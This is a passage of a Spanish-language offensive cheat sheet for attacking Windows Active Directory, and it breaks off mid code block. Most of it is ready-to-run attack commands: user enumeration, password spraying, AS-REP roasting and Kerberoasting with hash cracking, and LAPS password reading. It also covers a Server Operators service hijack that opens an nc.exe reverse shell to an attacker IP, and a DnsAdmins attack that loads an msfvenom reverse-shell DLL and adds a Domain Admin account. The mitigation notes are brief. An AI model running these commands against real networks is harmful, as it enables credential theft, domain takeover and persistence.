C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

## Active Directory

### Enumeración

Si no tenemos un usuario con el que empezar las pruebas (que suele ser el caso), tendremos que encontrar una manera de establecer un punto de apoyo en el dominio, ya sea obteniendo credenciales en texto claro o un hash de contraseña NTLM para un usuario, un shell SYSTEM en un host unido al dominio, o un shell en el contexto de una cuenta de usuario de dominio. Obtener un usuario válido con credenciales es crítico en las primeras etapas de una prueba de penetración interna. Este acceso (incluso al nivel más bajo) abre muchas oportunidades para realizar enumeraciones e incluso ataques.

#### Kerbrute

[Kerbrute](https://github.com/ropnop/kerbrute) puede ser una opción más sigilosa para la enumeración de cuentas de dominio. Se aprovecha del hecho de que los fallos de pre-autenticación Kerberos a menudo no activan registros o alertas. Utilizaremos Kerbrute junto con las listas de usuarios como pueden ser **jsmith.txt** o **jsmith2.txt** de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Este repositorio contiene muchas listas de usuarios diferentes que pueden ser extremadamente útiles cuando se intenta enumerar usuarios cuando se comienza desde una perspectiva no autenticada. Podemos apuntar Kerbrute al DC y alimentarlo con una lista de palabras. La herramienta es rápida, y se nos proporcionarán resultados que nos permitirán saber si las cuentas encontradas son válidas o no, lo cual es un gran punto de partida para lanzar ataques como el de Password Spraying.

Por medio de una lista de usuarios, como puede ser las mencionadas anteriormente podemos ver usuarios válidos a nivel de dominio gracias a los fallos de pre-autenticación Kerberos

```bash
kerbrute userenum -d HACKLAB.LOCAL --dc 192.168.56.10 jsmith.txt -o ad_users.txt
```

Puede haber veces que un usuario tenga de contraseña su mismo nombre de usuario:

```bash
kerbrute bruteuser --d HACKLAB.LOCAL -dc 192.168.56.10 jsmith.txt thomas.brown
```

Otras herramientas a tener en cuenta son [RPCClient](#426-rpcclient) y [Enum4Linux](#424-enum4linux).


#### lookupsid

Esta herramienta intentará forzar los identificadores de seguridad de Windows (SID) de cualquier usuario del dominio de AD. Cada usuario tiene un SID único, compuesto por su identificador relativo (RID) concatenado con el SID del dominio. Los SID de usuario suelen ser emitidos por un controlador de dominio y se utilizan en mecanismos de autorización y acceso, como parte del token de acceso creado durante el inicio de sesión.

```c
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

#### Password Spraying

Otro aspecto destacable es el ataque conocido como Password Spraying. Para contextualizar, imaginemos que disponemos de unas credenciales como `thomas.brown:MySup3erPass123!`. Una táctica común en este escenario es conectarse al Protocolo de Llamada a Procedimientos Remotos (RPC) - para extraer una lista de todos los usuarios del dominio. Esta lista se guarda en un archivo, por ejemplo users.txt, y luego se proporciona como entrada a herramientas como el propio netexec, junto con la contraseña antes mencionada. Este proceso permite intentar el acceso a múltiples cuentas del dominio, aprovechando la débil seguridad de la contraseña utilizada.

```bash
nxc smb 192.168.56.10 -u users.txt -p 'password' --continue-on-success
```

Por otra parte, si contamos con una lista de contraseñas también podemos utilizarlas.

```bash
nxc smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
```

El argumento `--no-bruteforce` se emplea para evitar la prueba de todas las contraseñas disponibles para cada usuario, en su lugar, se prueba el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la línea 2 con la contraseña de la línea 2, y así sucesivamente.

#### BloodHound

##### Opción 1

La primera forma de enumerar con Bloodhound, es hacerlo desde la máquina atacante utilizando `bloodhound.py`.

```bash
bloodhound-python -u 'user' -p 'password' -d HACKLAB.local -ns 192.168.56.10 --zip -c All
```

##### Opción 2

La segunda manera, consta de los siguientes pasos:

1. Descargar [SharpHound.ps1](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)

```bash
wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
```

2. Subirlo a la máquina víctima ya sea con un servidor de SMB o upload de evil-winrm.
3. Importar el módulo:
```powershell
powershell -ep bypass
Import-Module .\SharpHound.ps1
```
4. Invocar a `BloodHound`

```powershell
Invoke-BloodHound -CollectionMethod All
```
Ahora queda descargar el zip y meterlo en BloodHound.

##### Opción 3

Otra alternativa es utilizar [SharpHound.exe](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe).

```powershell
.\SharpHound.exe -c all
```

Por ultimo, descargamos el archivo `zip` nuevamente y los subimos en `BloodHound`.

#### ldapsearch

Para enumerar a través del protoclo LDAP, podemos usar la herramienta `ldapsearch`:

```bash
ldapsearch -H ldap://192.168.56.10 -x -s base namingcontexts
```

- `-H ldap://192.168.56.10`: Especifica el URI del servidor LDAP al que se va a conectar. En este caso, ldap://192.168.56.10.

- `-x`: Indica que se utilizará el método de autenticación simple. Esto es comúnmente utilizado para realizar pruebas, pero no es seguro para ambientes de producción.

- `-s base`: Especifica el alcance de la búsqueda. En este caso, base significa que la búsqueda se realiza en el objeto base especificado.

- `namingContexts`: Especifica el atributo que se desea buscar. En este caso, namingContexts es el atributo que contiene los contextos de nombres del servidor LDAP.

```bash
ldapsearch -x -H ldap://192.168.56.10 -D '' -w '' -b "DC=192.168.56.10,DC=local"
ldapsearch -x -h 192.168.56.10 -b "dc=hacklab,dc=local" "*" | awk '/dn: / {print $2}'
ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -b "DC=HACKLAB,DC=LOCAL"
ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -s base -b "DC=HACKLAB,DC=LOCAL" "(objectClass=*)" "*" +
```

#### ldapdomaindump

En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:

```bash
ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
```

Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.

#### LDAP

```bash
netexec ldap <RHOST> -u '' -p '' -M -user-desc
netexec ldap <RHOST> -u '' -p '' -M get-desc-users
netexec ldap <RHOST> -u '' -p '' -M ldap-checker
netexec ldap <RHOST> -u '' -p '' -M veeam
netexec ldap <RHOST> -u '' -p '' -M maq
netexec ldap <RHOST> -u '' -p '' -M adcs
netexec ldap <RHOST> -u '' -p '' -M zerologon
netexec ldap <RHOST> -u '' -p '' -M petitpotam
netexec ldap <RHOST> -u '' -p '' -M nopac
netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
```

### Permisos delegables en Active Directory

| Permiso               | Descripción                                                                    |
| --------------------- | ------------------------------------------------------------------------------ |
| `GenericAll`          | Permisos completos sobre el objeto. Puede hacer cualquier acción.              |
| `GenericWrite`        | Puede modificar ciertos atributos del objeto (no todos).                       |
| `WriteOwner`          | Puede cambiar el propietario del objeto.                                       |
| `WriteDACL`           | Puede modificar la lista de control de accesos (DACL) del objeto.              |
| `AllExtendedRights`   | Puede cambiar o resetear la contraseña, y ejecutar otras acciones extendidas.  |
| `ForceChangePassword` | Puede cambiar la contraseña del objeto sin conocer la actual.                  |
| `Self`                | Puede agregarse a sí mismo en ciertos atributos, como por ejemplo, a un grupo. |


### Kerberos

![Kerberos](/images/kerberos00.png)

Kerberos es un protocolo de **autenticación**, pero no de autorización. Esto significa que su función es verificar la identidad de un usuario mediante una contraseña conocida solo por él, sin definir a qué recursos o servicios puede acceder.  

En entornos **Active Directory**, Kerberos juega un papel clave al proporcionar información sobre los privilegios de los usuarios autenticados. Sin embargo, la responsabilidad de verificar si estos privilegios son suficientes para acceder a determinados recursos recae en los propios servicios.

El protocolo Kerberos opera a través de los puertos `UDP/88` y `TCP/88`, los cuales deben estar a la escucha en el `Key Distribution Center (KDC)` para garantizar el correcto funcionamiento del sistema de autenticación.

Kerberos involucra varios componentes encargados de gestionar la autenticación de los usuarios. Los principales son:

- **Cliente o usuario**: La entidad que desea acceder a un servicio.
- **Application Server (AP)**: El servidor donde se encuentra el servicio al que el usuario quiere acceder.
- **Key Distribution Center (KDC)**: Servicio central de Kerberos responsable de distribuir tickets a los clientes. Se ejecuta en el Controlador de Dominio (DC) e incluye:
- **Authentication Service (AS)**: Emite los Ticket Granting Tickets (TGTs), que permiten solicitar acceso a servicios sin necesidad de volver a introducir credenciales.

Para garantizar la seguridad, Kerberos cifra y firma varias estructuras, como los tickets, evitando que sean manipuladas por terceros. En Active Directory, se manejan las siguientes claves de cifrado:

- **Clave del KDC (krbtgt)**: Derivada del hash NTLM de la cuenta krbtgt.
- **Clave de usuario**: Derivada del hash NTLM del propio usuario.
- **Clave de servicio**: Basada en el hash NTLM del propietario del servicio, que puede ser una cuenta de usuario o del servidor.
- **Clave de sesión**: Generada dinámicamente entre el cliente y el KDC para asegurar la comunicación.
- **Clave de sesión de servicio**: Establecida entre el cliente y el AP para proteger la comunicación con el servicio.

##### Tickets

Kerberos utiliza **tickets**, estructuras que permiten a los usuarios autenticados realizar acciones dentro del dominio de Kerberos sin necesidad de volver a introducir credenciales. Existen dos tipos principales:

- **Ticket Granting Ticket (TGT)**: Se presenta ante el KDC para solicitar otros tickets de servicio (TGS). Está cifrado con la clave del KDC.
- **Ticket Granting Service (TGS)**: Se presenta ante un servicio para obtener acceso a sus recursos. Está cifrado con la clave del servicio correspondiente.

##### PAC

El **Privilege Attribute Certificate (PAC)** es una estructura incluida en la mayoría de los tickets, que contiene los privilegios del usuario. Está firmada con la clave del KDC, lo que garantiza su integridad.

Si bien los servicios pueden verificar el PAC comunicándose con el KDC, esto no es una práctica común. En cualquier caso, esta verificación solo consiste en comprobar la firma del PAC, sin validar si los privilegios del usuario son correctos.

Además, un cliente puede evitar que el PAC se incluya en su ticket especificándolo en el campo `KERB-PA-PAC-REQUEST` de la solicitud.

##### Mensajes

Kerberos permite la comunicación entre sus agentes mediante distintos tipos de mensajes, entre los más relevantes se encuentran:

- **KRB_AS_REQ**: Enviado por el usuario para solicitar un TGT al KDC.
- **KRB_AS_REP**: Respuesta del KDC, que entrega el TGT al usuario.
- **KRB_TGS_RE**Q: Enviado por el usuario para solicitar un TGS al KDC, utilizando su TGT.
- **KRB_TGS_RE**P: Respuesta del KDC, que envía el TGS solicitado al usuario.
- **KRB_AP_REQ**: (Opcional) Utilizado por un servicio para autenticarse frente al usuario.
- **KRB_ERROR:** Usado por los distintos agentes para notificar errores en la comunicación.

Adicionalmente, aunque no forma parte del protocolo Kerberos sino de NRPC, el Application Server (**AP**) puede utilizar el mensaje `KERB_VERIFY_PAC_REQUEST` para enviar la firma del **PAC** al **KDC** y verificar su validez.

A continuación se muestra un resumen de los mensajes siguiendo la secuencia de autenticación.

![Flujo de autenticación de Kerberos](/images/kerberos01.png)

### AS-REPRoasting

**AS-REPRoasting** es uno de los ataques más básicos contra Kerberos y tiene como objetivo cuentas sin **preautenticación habilitada**. Aunque es poco común en entornos bien configurados, es uno de los pocos ataques de Kerberos que **no requiere autenticación previa**.  

El único dato que el atacante necesita es el **nombre de usuario** de la víctima, algo que puede obtener mediante técnicas de **enumeración**. Con esta información, el atacante envía una solicitud **AS_REQ** (Authentication Service Request) al **KDC** (Key Distribution Center), haciéndose pasar por el usuario.  

Dado que la preautenticación está deshabilitada, el **KDC** responde con un **AS_REP**, que incluye datos cifrados con una clave derivada de la **contraseña del usuario**. El atacante puede capturar este mensaje y realizar un **ataque de fuerza bruta o cracking offline** para recuperar la contraseña.

#### Desde Linux

Se puede utilizar el script [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) de Impacket para recolectar mensajes AS_REP sin pre-autenticacin desde una máquina Linux. Los siguientes comandos permiten utilizar una lista de usuarios o dadas una credenciales, realizar una consulta LDAP para obtener usuarios sobre los que realizar el ataque:

> **AS-REPRoasting** es similar a **Kerberoasting**, pero en lugar de atacar las respuestas **TGS-REP**, se dirige a las respuestas **AS-REP**.

```bash
impacket-GetNPUsers -usersfile ad_users.txt hacklab.local/ -dc-ip 192.168.56.10 -format hashcat -outputfile hashes.asreproast -no-pass
```

#### Desde Windows

Podemos usar Rubeus para llevar a cabo este ataque desde una máquina Windows:

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```

#### Crackeando el ASP_REP

```bash
hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt
```

```bash
john --wordlist=rockyou.txt hashes.asreproast
```

#### Mitigación del ataque AS-REP Roast

- Habilitar la preautenticación Kerberos:

    - En PowerShell, podemos uitilizar el cmdlet Set-ADUser `-KerberosEncryptionType None` para verificar y ajustar la configuración.
    - En Active Directory Users and Computers (ADUC), en la sección de propiedades del usuario, seleccionar la pestaña "Cuenta" y asegúrarse de que la opción "No requerir preautenticación Kerberos" no esté marcada.

- Utilizar contraseñas robustas.
- Revisión de políticas de seguridad.

### Kerberoasting

**Kerberoasting** es un ataque dirigido a **cuentas de servicio** en **Active Directory**, que permite a un atacante descifrar contraseñas fuera de línea. A diferencia de **AS-REP Roasting**, este ataque **requiere autenticación previa** en el dominio, es decir, el atacante necesita acceso con una cuenta de usuario, aunque sea de **bajo privilegio**, o un sistema dentro de la red del dominio.

Cuando un servicio se registra en Active Directory, se le asigna un **Service Principal Name (SPN)**, que actúa como alias para una cuenta de servicio real. Esta información incluye el **nombre del servidor, el puerto y el hash de la contraseña de la cuenta de servicio**. Idealmente, estas cuentas deberían tener contraseñas seguras con mecanismos de **auto-rotación**, pero en la práctica, **muchos SPN están asociados a cuentas de usuario en lugar de cuentas de servicio**, debido a configuraciones deficientes o falta de soporte por parte de algunos proveedores.

Si una cuenta de servicio tiene una contraseña débil, un atacante puede explotar esta vulnerabilidad. **Cualquier usuario del dominio puede solicitar un Ticket Granting Service (TGS) para cualquier servicio registrado en el dominio**. Una vez recibido el **TGS**, el atacante puede extraerlo y descifrarlo offline, utilizando herramientas como **Hashcat** o **John the Ripper**, para intentar recuperar la contraseña de la cuenta asociada al servicio.

#### Desde Linux

Con una máquina Linux, se pueden obtener todos los TGS’s utilizando el script [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) de impacket. Con el siguiente comando se puede llevar a cabo el ataque y salvar los TGS’s descubiertos:

```bash
impacket-GetUserSPNs hacklab.local/pparker:Password123 -dc-ip 192.168.56.10 -request -outputfile hashes.kerberoast
```

[https://www.netexec.wiki/ldap-protocol/kerberoasting](https://www.netexec.wiki/ldap-protocol/kerberoasting)

#### Desde Windows

Del mismo modo, se puede realizar el ataque de Kerberoasting desde Windows con varias herramientas como Rubeus.

```powershell
.\Rubeus.exe kerberoast /creduser:hacklab.local\\\\pparker /credpassword:Password123 /outfile:hashes.kerberoast
```

#### Crackeando los TGS's

Utilizamos `hashcat` para romper el hash y recuperar la contraseña de la cuenta de servicio.

|Modo|Descripción|
|---|---|
|`13100`|Kerberos 5 TGS-REP etype 23 (RC4)|
|`19600`|Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)|
|`19700`|Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)|
|`18200`|Kerberos 5, etype 23, AS-REP|

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

John The Ripper

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
```

#### Asignar SPN a un usuario

En caso de tener un permiso como `GenericAll` o `GenericWrite` lo que podemos hacer es Asignar un SPN falso a la cuenta de usuario para luego obtener el hash devuelte por TGS-REP y crackearlo.

```powershell
Import-module .\\PowerView.ps1
Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/fakespn'}
```

#### Mitigación del ataque Kerberoasting

- Utilizar contraseñas robustas.
- Privilegios mínimos: Otorgar a los usuarios únicamente los privilegios necesarios para realizar sus tareas específicas y restringir cualquier privilegio adicional que no sea esencial para evitar posibles riesgos de seguridad. Este enfoque ayuda a reducir la superficie de ataque y a limitar el impacto de posibles violaciones de seguridad.
- No ejecutar las cuentas de Servicio como Administrador del Dominio.

### LAPS

**LAPS** significa **Local Administrator Password Solution**. Es una solución de Microsoft para manejar automáticamente las contraseñas del usuario administrador local (**Administrador**) en máquinas que están unidas a un dominio.

#### ¿Para qué sirve?

- Imagina que tenés 100 PCs con la misma contraseña para el usuario `Administrador`. Si alguien obtiene esa pass, puede moverse por toda la red fácilmente (movimiento lateral).
- Con LAPS, **cada máquina tiene una contraseña diferente para el administrador local**, y esas contraseñas se guardan cifradas en el **Active Directory**.
- Solo usuarios autorizados pueden leer esas contraseñas.

#### ¿Cómo funciona?

1. Cada máquina rota la contraseña local del administrador cada X días (por política).    
2. La nueva contraseña se guarda en un atributo del objeto de equipo en Active Directory (por ej., `ms-Mcs-AdmPwd` en LAPS clásico, o `msLAPS-Password` en LAPS nuevo).    
3. Solo usuarios o grupos con permiso pueden **leer esa contraseña**.

#### ¿Qué es **ReadLAPSPassword**?

Este es un **permiso de Active Directory** que le da a un usuario o grupo la capacidad de **leer la contraseña del admin local** almacenada por LAPS en una máquina específica.

#### ¿Por qué es importante?


Referencia: [https://www.thehacker.recipes/ad/movement/dacl/readlapspassword](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)

```bash
pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
```

```bash
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps

# El filtro COMPUTER puede ser un nombre o un comodín (por ejemplo WIN-S10, WIN-* etc. Por defecto: *)
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps -O computer="target-*"
```

### Flags de userAccountControl (AD)

| Nombre                      | Valor (Decimal) | Valor (Hexadecimal) | Descripción                                                              |
| ------------------------------ | --------------- | ------------------- | ------------------------------------------------------------------------ |
| SCRIPT                         | 1               | 0x0001              | Script de inicio asociado a la cuenta.                                   |
| ACCOUNTDISABLE                 | 2               | 0x0002              | Cuenta deshabilitada.                                                    |
| HOMEDIR_REQUIRED               | 8               | 0x0008              | Requiere un home directory.                                              |
| LOCKOUT                        | 16              | 0x0010              | Cuenta bloqueada.                                                        |
| PASSWD_NOTREQD                 | 32              | 0x0020              | No se requiere contraseña. (útil en algunos ataques)                     |
| PASSWD_CANT_CHANGE             | —               | —                   | No es una flag directa, se controla vía ACLs.                            |
| ENCRYPTED_TEXT_PWD_ALLOWED     | 128             | 0x0080              | Permite contraseñas en texto claro. (inseguro)                           |
| TEMP_DUPLICATE_ACCOUNT         | 256             | 0x0100              | Cuenta temporal de replicación.                                          |
| NORMAL_ACCOUNT                 | 512             | 0x0200              | Cuenta de usuario estándar.                                              |
| INTERDOMAIN_TRUST_ACCOUNT      | 2048            | 0x0800              | Cuenta de confianza entre dominios.                                      |
| WORKSTATION_TRUST_ACCOUNT      | 4096            | 0x1000              | Cuenta de equipo (join a dominio).                                       |
| SERVER_TRUST_ACCOUNT           | 8192            | 0x2000              | Controlador de dominio.                                                  |
| DONT_EXPIRE_PASSWORD           | 65536           | 0x10000             | La contraseña no expira nunca.                                           |
| MNS_LOGON_ACCOUNT              | 131072          | 0x20000             | Cuenta para cluster MNS.                                                 |
| SMARTCARD_REQUIRED             | 262144          | 0x40000             | Requiere autenticación con smartcard.                                    |
| TRUSTED_FOR_DELEGATION         | 524288          | 0x80000             | Esta cuenta puede hacer delegación (Unconstrained Delegation).           |
| NOT_DELEGATED                  | 1048576         | 0x100000            | No puede ser usada para delegación.                                      |
| USE_DES_KEY_ONLY               | 2097152         | 0x200000            | Sólo usa DES (inseguro, deprecated).                                     |
| DONT_REQUIRE_PREAUTH           | 4194304         | 0x400000            | ⚠️ **No requiere preautenticación Kerberos** (usado en AS-REP Roasting). |
| PASSWORD_EXPIRED               | 8388608         | 0x800000            | La contraseña expiró.                                                    |
| TRUSTED_TO_AUTH_FOR_DELEGATION | 16777216        | 0x1000000           | Constrained delegation (S4U2Self).                                       |
| PARTIAL_SECRETS_ACCOUNT        | 67108864        | 0x4000000           | Cuenta protegida con secretos parciales (Windows 10/2016+).              |

> Podemos combinar múltiples flags con OR binario (`-bor`) y removerlas con AND + NOT (`-band -bnot`).

### Server Operators

Es un grupo `built-in` en los controladores de dominio (DC) que tiene privilegios para administrar servidores, pero no es un grupo administrativo a nivel dominio como Domain Admins.

Sin embargo, si el DC es el único “servidor” en el entorno, este grupo puede ser la puerta directa para escalar a Domain Admin.

#### Privilegios que tiene por defecto

Un miembro de Server Operators puede hacer lo siguiente en un Domain Controller:

- Reiniciar o apagar el sistema
- Cargar y descargar driver
- Realizar backups y restores
- Iniciar/Detener servicios
- Conectarse vía RDP
- Escribir en `C:\Windows\Tasks`


#### Explotación

##### Abuso de privilegios de servicios

```bash
sc.exe config someService binPath= "C:\\temp\\nc.exe -e cmd 10.10.14.11 4444"
sc.exe stop someService
sc.exe start someService
```

##### Agregarte a Administradores Locales del DC

Ya que podemos escribir sobre el servicio o hacer RDP, podemos ejecutarte como `NT AUTHORITY\\SYSTEM` y:

```bash
net localgroup administrators hacker /add
```

##### Insertar payloads en tareas programadas (Scheduled Tasks)

Podemos escribir en `C:\\Windows\\Tasks`, lo que se puede usar para ejecución diferida o persistencia.

### Account Operators

Es un grupo incorporado de Active Directory pensado para delegar la gestión de cuentas de usuarios y grupos estándar, sin dar acceso completo de administración del dominio.


```powershell
net group "Account Operators" /domain
```

O desde PowerView:

```powershell
Get-NetGroupMember -GroupName "Account Operators"
```

#### Privilegios del grupo

Por defecto, los miembros de Account Operators pueden:

- Crear, modificar y eliminar cuentas de usuarios en los siguientes contenedores:
    - `CN=Users`
    - `CN=Computers`
- Agregar usuarios a grupos locales (¡no de dominio!)
- Leer y escribir muchos atributos de cuentas de usuario (como userAccountControl, description, etc.)
- Resetear contraseñas de cuentas que no sean administradores.

No pueden tocar:

- Miembros de grupos protegidos (ej: Domain Admins, Administrators, Enterprise Admins, etc.)
- Atributos “sensibles” como adminCount = 1 (si está bien protegido)
- Cuentas fuera del scope delegado (como en OUs personalizadas)

#### Ejemplo 1 - Cambiar la contraseña de otra cuenta

Si encontramos un usuario sin `adminCount` y dentro del scope de Account Operators:

```bash
Set-ADAccountPassword -Identity tyrell.wellick -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

#### Ejemplo 2 – Agregar usuario a un grupo importante

> Si tenemos WriteProperty o GenericAll sobre un grupo importante como “Server Operators” o “Backup Operators”, podemos agregarnos.

```bash
Add-ADGroupMember -Identity 'Server Operators' -Members hacker
```

Desde aquí, podemos abusar del grupo (como Backup Operators para leer SAM/NTDS.dit).

#### Ejemplo 3 - Asignar SPN a un usuario - Kerberoasting

```bash
Import-module .\\PowerView.ps1
Set-DomainObject -Identity tyrell.wellick -SET @{serviceprincipalname='nonexistent/fake'}
```

### DnsAdmins

Los usuarios que son miembros del grupo **DnsAdmins** tienen la capacidad de abusar de una característica del protocolo de gestión DNS de Microsoft para hacer que el servidor DNS cargue cualquier DLL especificada. El servicio que a su vez, ejecuta la DLL se realiza en el contexto de SYSTEM y podría utilizarse en un controlador de dominio (desde donde se ejecuta DNS normalmente) para obtener privilegios de administrador de dominio.

En el siguiente ejemplo, el usuario `ryan` pertenece al grupo `DnsAdmins`.

**PowerShell usando el módulo ActiveDirectory**

```powershell
Get-ADGroupMember -Identity "DnsAdmins"
```

**Powerview**

```powershell
Get-NetGroupMember -Identity "DNSAdmins"
```

**net**

```powershell
net user ryan /domain
```

![Dnsadmins](/images/dnsadmins.png)

#### Explotación

**1. Creación de la DLL maliciosa**

`msfvenom` puede ser utilizado para crear una DLL maliciosa que, cuando es ejecutada por DNS se conectará de nuevo a la máquina del atacante en el contexto de SYSTEM en el Domain Controller.

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f dll > exploit.dll
```

**2. Creamos un recurso compartido con `impacket-smbserver`**

```bash
impacket-smbserver -smb2support kali .
```

**3. Registrar la DLL.**

Una vez que la DLL maliciosa se ha cargado en el objetivo, se puede utilizar el siguiente comando para registrar la DLL.

```powershell
dnscmd.exe RESOLUTE /config /serverlevelplugindll \\10.10.14.11\kali\exploit.dll
```

1. dnscmd.exe: Es una herramienta de línea de comandos utilizada para administrar y configurar servidores DNS en entornos de Windows.

2. resolute: Es el nombre del servidor DNS al que se enviará el comando. En este caso, "resolute" es el nombre de ejemplo del servidor al que se desea enviar la configuración.

3. `/config`: Indica que se está realizando una operación de configuración en el servidor DNS.

4. `/serverlevelplugindll`: Este parámetro especifica que se está configurando un complemento DLL a nivel de servidor en el servidor DNS. Los complementos DLL pueden proporcionar funcionalidades adicionales al servidor DNS.

5. `C:\Users\Ryan\Documents\exploit.dll`: Esta es la ruta de la DLL que se está intentando cargar como complemento en el servidor DNS. En este caso, se está especificando la ruta completa del archivo DLL llamado `exploit.dll` ubicado en la carpeta "`C:\Users\Moe\Documents`".

6. Escucha con netcat (Kali). En nuestro host de ataque, nos ponemos en escucha con netcat en el puerto especificado anteriormente en el comando msfvenom.

```bash
rlwrap nc -lnvp 4444
```

7. Detener e iniciar el servicio DNS

A partir de aquí, detener el servicio DNS e iniciarlo de nuevo generará un intérprete de comandos SYSTEM para el oyente netcat.

```powershell
sc.exe stop dns
sc.exe start dns
```

8. Persistencia

Desde aquí se puede conseguir la persistencia de Administrador de Dominio. Se puede crear un nuevo usuario con privilegios de Administrador de Dominio.

```bash
net user hacker Password123! /add && net group "Domain Admins" /add hacker
```

### BloodyAD

#### Enumerando usando bloodyAD

**BloodyAD usa la función `get` para obtener información de un DC.**

**Obtener información de un usuario**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123! --host 192.169.56.10 get object $target_username
```

**Obtener miembros de un grupo**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123! --host 192.169.56.10 get object Users --attr member
```

**Obtener la política de longitud mínima de contraseña**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123! --host 192.169.56.10 get object 'DC=hacklab,DC=local' --attr minPwdLength
```

**Obtener el nivel funcional del AD**
```bash
bloodyAD -u Administrator -d hacklab -p Password123! --host 192.168.56.10 get object 'DC=hacklab,DC=local' --attr msDS-Behavior-Version
```

**Obtener todos los usuarios del dominio**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123! --host 192.168.56.10 get children 'DC=hacklab,DC=local' --type user
```

**Obtener todos los equipos del dominio**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123! --host 192.168.56.10 get children 'DC=hacklab,DC=local' --type computer
```

**Obtener flags de UserAccountControl**
```bash
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.56.10 get object john.doe --attr userAccountControl
```

**Obtener registros DNS del AD**
```bash
bloodyAD -u elliot.alderson -p Password123! -d hacklab.local --host 192.168.56.10 get dnsDump
```

**Obtener usuario**
```bash
bloodyAD -d hacklab.local --host 192.168.56.10 -u Administrator -p :50123468cb0524c799ac25b439ab6a21 get object administrator
```

**Obtener miembros de un grupo**
```bash
bloodyAD -d hacklab.local --host 192.168.56.10 -u Administrator -p :50123468cb0524c799ac25b439ab6a21 get object 'Domain Admins'
```

#### Atacando AD usando bloodyAD

**Habilitar DONT_REQ_PREAUTH para ASREPRoast**
```bash
bloodyAD -u Administrator -d hacklab -p Password123! --host 192.168.56.10 add uac bob DONT_REQ_PREAUTH
```

**Deshabilitar ACCOUNTDISABLE**
```bash
bloodyAD -u Administrator -d hacklab -p Password123! --host 192.168.56.10 remove uac bob ACCOUNTDISABLE
```

**Leer la contraseña de una cuenta GMSA**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123 --host 192.168.56.10 get object 'gmsaAccount$' --attr msDS-ManagedPassword
```

**Leer la cuota para agregar equipos al dominio**
```bash
bloodyAD -u elliot.alderson -d hacklab -p Password123! --host 192.168.56.10 get object 'DC=hacklab,DC=local' --attr ms-DS-MachineAccountQuota
```

**Agregar entrada DNS**
```bash
bloodyAD -u elliot.alderson -p Password123! -d hacklab.local --host 192.168.56.10 add dnsRecord my_machine_name 192.168.56.5
```

**Eliminar entrada DNS**
```bash
bloodyAD -u elliot.alderson -p Password123! -d hacklab.local --host 192.168.56.10 remove dnsRecord my_machine_name 192.168.56.5
```

**Establecer contraseña de un usuario**
```bash
